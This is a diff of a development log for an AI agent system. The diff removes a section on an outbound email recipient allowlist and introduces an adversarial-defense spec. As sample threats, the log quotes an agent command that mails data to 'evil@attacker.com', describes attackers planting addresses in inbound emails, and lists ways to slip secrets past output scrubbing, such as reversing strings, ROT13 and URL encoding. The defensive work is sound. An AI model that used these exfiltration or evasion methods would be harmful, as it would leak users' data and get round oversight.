@@ -19,31 +19,6 @@ Verified: the four failing channel-gate tests now pass on PDT, and the full 3448
 **Files added/modified:**
 - `src/istota/db.py` — `update_task_status()` and `update_istota_file_task_status()` now write `started_at` / `completed_at` / `updated_at` via SQLite `datetime('now')` directly instead of `datetime.now().isoformat()` parameters.
 
-## 2026-04-26: Layer A — recipient allowlist on outbound email
-
-First concrete adversarial-defense layer from the new spec at `Notes/Projects/Istota/Adversarial agent defense spec.md`. The skill proxy already keeps SMTP credentials out of the agent's env, but a prompt-injected agent can still call `istota-skill email send --to evil@attacker.com` because the proxy injects credentials into the skill subprocess regardless of recipient. Closes the most realistic exfiltration channel: convincing the agent to mail user data to an attacker.
-
-The gate: build a per-user "known recipients" set from prior correspondence (`sent_emails.to_addr`, `processed_emails.sender_email`), the runtime `trusted_email_senders` table, and the user's own `email_addresses`. Pass it to the skill subprocess via two env vars (`ISTOTA_KNOWN_RECIPIENTS`, `ISTOTA_TRUSTED_RECIPIENT_PATTERNS` for fnmatch globs). The skill checks `--to` before sending; on miss it writes `task_{id}_pending_send.json` and exits with `{"status": "pending_confirmation", ...}`. The scheduler picks up the deferred file post-task, transitions to `pending_confirmation` with a body-preview prompt posted to the user's alerts channel, and the existing three-path confirmation-reply machinery handles yes/no/yes-trust replies.
-
-The non-obvious bit is the **prompt-extraction allowlist**. When the user types "email john@example.com about dinner" in Talk, the agent should send to john without confirmation even if john has never corresponded with us. The executor extracts addresses from the verbatim task prompt — but only when `task.source_type in TRUSTED_PROMPT_SOURCES = {"cli", "talk", "scheduled", "subtask"}`. Email-sourced tasks are excluded because the prompt is the inbound email body (untrusted) — otherwise an attacker could include their own address in the email they send Istota.
-
-On confirmation re-run, the executor reads `task_{id}_pending_send.json` and adds the queued recipients to the per-task allowlist for that single execution; the agent re-calls send with the same args and the gate passes. "Yes trust" calls `db.add_trusted_sender` for each recipient (semantics are bidirectional — if we trust them as senders we can mail them without prompting). "No" calls `cancel_task` and unlinks the file.
-
-Fail-open behavior: if neither env var is set, the gate is bypassed. This preserves direct CLI use (no executor → no env vars) and lets the operator disable the gate via the new `[security] outbound_gate_email = false` (default true). Wired through Ansible as `istota_security_outbound_gate_email` for ops control during rollback / migration.
-
-Subtle scheduler integration: the deferred-pending-send handler runs **first** in the post-success batch and short-circuits the rest if it queues a confirmation — no point recording sent_emails for mail that wasn't actually sent. Also clears `post_talk_message`/`post_email` to avoid the agent's "I queued an email" text duplicating the richer confirmation prompt that goes to the alerts channel.
-
-**Files added/modified:**
-- `src/istota/db.py` — `get_known_recipients_for_user()` unions four sources and lowercases.
-- `src/istota/skills/email/__init__.py` — `_is_recipient_allowed()` (env-var lookup + fnmatch), `_defer_send()` (writes `task_{id}_pending_send.json`); `cmd_send` now gates before calling `send_email()`.
-- `src/istota/skills/email/skill.md` — documented the queued-for-confirmation status and instructed the agent to end its turn rather than retry on a miss.
-- `src/istota/executor.py` — `TRUSTED_PROMPT_SOURCES`, `_extract_addresses_from_prompt()` (regex), `_read_pending_send_recipients()`; populates `ISTOTA_KNOWN_RECIPIENTS` + `ISTOTA_TRUSTED_RECIPIENT_PATTERNS` in the SMTP env block; gated by `config.security.outbound_gate_email`.
-- `src/istota/scheduler.py` — `_process_deferred_pending_sends()`; runs first in deferred batch; transitions to `pending_confirmation`, posts to alerts channel via existing `send_talk_confirmation`/`resolve_conversation_token`; doesn't delete the file (executor needs it on re-run); confirmation-rerun path detects leftover file and cleans up.
-- `src/istota/talk_poller.py` — `handle_confirmation_reply` now distinguishes inbound-gate vs outbound-gate confirmations by checking for `task_{id}_pending_send.json`; "yes trust" on outbound adds each recipient to `trusted_email_senders`; "no" unlinks the file.
-- `src/istota/config.py` — `SecurityConfig.outbound_gate_email: bool = True`; parsed from `[security] outbound_gate_email`.
-- `deploy/ansible/defaults/main.yml`, `deploy/ansible/templates/config.toml.j2`, `config/config.example.toml` — Ansible var + template + example wiring.
-- `tests/test_skill_email_recipient_gate.py` (new), `tests/test_executor_recipient_allowlist.py` (new), `tests/test_scheduler_pending_send.py` (new) — 34 tests covering env-var matching, fnmatch patterns, deferred-file shape, prompt extraction per source type, sent-email history, trusted-sender patterns, confirmation re-run, gate-disabled kill switch, multi-recipient batching, malformed-file cleanup.
-
 ## 2026-04-26: Adversarial defense spec + DNS hardening for browse container
 
 Wrote `Notes/Projects/Istota/Adversarial agent defense spec.md` covering five ranked layers for protecting against prompt-injected agents (not fat-finger leaks — the [outbound scrubbing spec](Notes/Projects/Istota/Outbound%20secret%20scrubbing%20spec.md) covers that). Output scrubbing is trivially defeated by an adversarial agent (reverse the string, ROT13, encode in URL paths, smuggle in choice of words); the leverage is in narrowing what the agent *can* do.
